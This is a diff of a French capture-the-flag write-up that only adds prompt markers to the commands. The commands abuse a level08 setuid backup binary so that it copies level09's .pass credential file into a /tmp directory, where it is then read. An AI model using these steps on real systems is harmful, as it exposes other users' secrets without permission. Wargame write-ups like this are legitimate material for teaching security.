@@ -23,14 +23,15 @@ suffit donc de nous deplacer dans un dossier dans lequel nous avons les droits
 d'ecriture pour realiser notre exploit avec les commandes suivantes:
 
 -- Nous deplacer dans le dossier dans lequel nous avons droit d'ecriture
-cd /tmp
+
+> cd /tmp
 
 -- Creer un dossier backup contenant une reproduction du chemin complet vers
 notre fichier cible:
-mkdir -p ./backups/home/users/level09/
+> mkdir -p ./backups/home/users/level09/
 
 -- Executer notre le binaire avec le chemin complet de notre fichier cible:
-/home/users/level08/level08 /home/users/level09/.pass
+> /home/users/level08/level08 /home/users/level09/.pass
 
 -- Lire notre flag
-cat home/users/level09/.pass
+> cat home/users/level09/.pass
